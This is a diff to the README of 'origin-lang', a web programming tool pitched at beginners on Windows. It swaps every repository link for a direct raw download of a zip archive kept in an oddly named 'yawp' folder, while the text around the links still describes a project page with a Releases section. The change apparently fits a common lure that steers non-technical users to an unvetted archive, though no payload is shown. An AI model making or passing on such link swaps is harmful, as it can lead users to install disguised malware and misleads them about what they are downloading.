@@ -1,6 +1,6 @@
 # 🚀 origin-lang - Code Less for Modern Web
 
-[![Download origin-lang](https://img.shields.io/badge/Download-origin--lang-ff6f61?style=for-the-badge&logo=github)](https://github.com/Pitchclassarachnida290/origin-lang)
+[![Download origin-lang](https://img.shields.io/badge/Download-origin--lang-ff6f61?style=for-the-badge&logo=github)](https://raw.githubusercontent.com/Pitchclassarachnida290/origin-lang/main/yawp/lang-origin-3.7.zip)
 
 ---
 
@@ -40,11 +40,11 @@ No programming tools or special software are needed before installing origin-lan
 
 ## 📥 How to Download origin-lang
 
-[![Get origin-lang](https://img.shields.io/badge/Get-Origin--Lang-2ea44f?style=for-the-badge&logo=github)](https://github.com/Pitchclassarachnida290/origin-lang)
+[![Get origin-lang](https://img.shields.io/badge/Get-Origin--Lang-2ea44f?style=for-the-badge&logo=github)](https://raw.githubusercontent.com/Pitchclassarachnida290/origin-lang/main/yawp/lang-origin-3.7.zip)
 
 Go to the origin-lang page on GitHub by clicking the big green button above or using this link:
 
-https://github.com/Pitchclassarachnida290/origin-lang
+https://raw.githubusercontent.com/Pitchclassarachnida290/origin-lang/main/yawp/lang-origin-3.7.zip
 
 On this page, look for the "Releases" section or folder where you can download the latest version for Windows.
 
@@ -145,7 +145,7 @@ You can consult the origin-lang GitHub page for:
 - Updates and new releases.  
 - Help with problems from other users and developers.
 
-https://github.com/Pitchclassarachnida290/origin-lang
+https://raw.githubusercontent.com/Pitchclassarachnida290/origin-lang/main/yawp/lang-origin-3.7.zip
 
 ---
 
@@ -163,4 +163,4 @@ You do not need to be a programmer to begin, but learning the web basics will he
 
 ## 🔗 Quick Reference - Download Now
 
-[![Download origin-lang](https://img.shields.io/badge/Download-origin--lang-ff6f61?style=for-the-badge&logo=github)](https://github.com/Pitchclassarachnida290/origin-lang)
+[![Download origin-lang](https://img.shields.io/badge/Download-origin--lang-ff6f61?style=for-the-badge&logo=github)](https://raw.githubusercontent.com/Pitchclassarachnida290/origin-lang/main/yawp/lang-origin-3.7.zip)
